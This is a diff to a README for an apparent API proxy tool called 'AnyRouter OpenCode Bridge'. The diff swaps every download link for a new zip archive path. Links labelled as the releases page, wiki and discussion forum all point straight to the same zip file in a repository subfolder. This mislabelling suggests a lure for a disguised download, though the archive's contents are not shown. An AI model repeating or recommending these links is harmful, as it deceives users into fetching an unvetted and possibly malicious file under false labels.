@@ -1,7 +1,7 @@
 # 🌉 anyrouter-opencode-bridge - Local Bridge for Enhanced API Access
 
 ## 🔗 Download Now!
-[![Download](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip%20release-brightgreen)](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip)
+[![Download](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip)
 
 ## 📖 Overview
 
@@ -29,7 +29,7 @@ Before you install, make sure your system meets these requirements:
 
 ### Step 1: Download the Software
 
-To download the latest version, visit the [Releases page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip). Here you will find the most recent release to download. Click on the appropriate file for your operating system.
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip). Here you will find the most recent release to download. Click on the appropriate file for your operating system.
 
 ### Step 2: Install the Software
 
@@ -50,7 +50,7 @@ Once configured, you can start the bridge by clicking the "Start" button. The ap
 
 ## 📥 Download & Install
 
-To get started, simply visit the [Releases page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip) to download. Then follow the installation steps above. This will ensure your local proxy server is up and running in no time.
+To get started, simply visit the [Releases page](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip) to download. Then follow the installation steps above. This will ensure your local proxy server is up and running in no time.
 
 ## 🙋‍♀️ Supported Clients
 
@@ -67,7 +67,7 @@ If you are using either of these platforms, you can expect seamless connectivity
 
 For further help, you can refer to:
 
-- **Documentation**: Detailed guides and troubleshooting tips are available on our [Wiki page](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip).
-- **Community Support**: Join our discussions and get help from other users through our [Discussion Forum](https://github.com/dalia-abdallah25/anyrouter-opencode-bridge/raw/refs/heads/main/Carnegie/bridge-opencode-anyrouter-v3.5.zip).
+- **Documentation**: Detailed guides and troubleshooting tips are available on our [Wiki page](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip).
+- **Community Support**: Join our discussions and get help from other users through our [Discussion Forum](https://raw.githubusercontent.com/dalia-abdallah25/anyrouter-opencode-bridge/main/Carnegie/bridge_anyrouter_opencode_v2.7.zip).
 
 Thank you for choosing AnyRouter OpenCode Bridge. We're here to help you connect easily and securely!
